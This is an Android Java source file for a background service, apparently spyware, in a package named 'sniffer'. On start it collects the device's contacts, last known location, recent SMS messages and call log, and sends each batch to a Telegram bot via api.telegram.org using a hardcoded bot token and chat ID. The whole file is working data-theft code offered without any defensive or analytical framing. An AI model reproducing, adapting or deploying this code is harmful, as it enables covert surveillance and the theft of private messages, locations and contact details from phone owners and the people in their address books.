package com.v8.global.sniffer;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.widget.Toast;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class DataService extends Service {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private OkHttpClient client = new OkHttpClient();

    @Override
    public void onCreate() {
        super.onCreate();
        Toast.makeText(this, "✅ بدء سحب البيانات", Toast.LENGTH_LONG).show();
        
        new Thread(() -> {
            sendMessage("✅ Service Started");
            getContacts();
            getLocation();
            getSms();
            getCallLog();
            sendMessage("✅ All data collected");
        }).start();
    }

    private void getContacts() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            StringBuilder sb = new StringBuilder("📇 Contacts:\n");
            int count = 0;
            while (cursor != null && cursor.moveToNext() && count < 30) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append(name).append(": ").append(number).append("\n");
                count++;
            }
            if (cursor != null) cursor.close();
            sendMessage(sb.toString());
        } catch (Exception e) {
            sendMessage("❌ Contacts error: " + e.getMessage());
        }
    }

    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (location != null) {
                sendMessage("📍 Location: " + location.getLatitude() + "," + location.getLongitude());
            } else {
                sendMessage("📍 Location: Not available");
            }
        } catch (Exception e) {
            sendMessage("❌ Location error: " + e.getMessage());
        }
    }

    private void getSms() {
        try {
            Cursor cursor = getContentResolver().query(
                android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
            StringBuilder sb = new StringBuilder("📨 SMS:\n");
            while (cursor != null && cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                sb.append(address).append(": ").append(body).append("\n");
            }
            if (cursor != null) cursor.close();
            sendMessage(sb.toString());
        } catch (Exception e) {
            sendMessage("❌ SMS error: " + e.getMessage());
        }
    }

    private void getCallLog() {
        try {
            Cursor cursor = getContentResolver().query(
                android.net.Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
            StringBuilder sb = new StringBuilder("📞 Calls:\n");
            while (cursor != null && cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex("number"));
                sb.append(number).append("\n");
            }
            if (cursor != null) cursor.close();
            sendMessage(sb.toString());
        } catch (Exception e) {
            sendMessage("❌ Calls error: " + e.getMessage());
        }
    }

    private void sendMessage(String text) {
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                .post(new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build())
                .build();
        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override public void onResponse(Call call, Response response) { 
                try { response.close(); } catch (Exception e) {}
            }
            @Override public void onFailure(Call call, IOException e) {}
        });
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
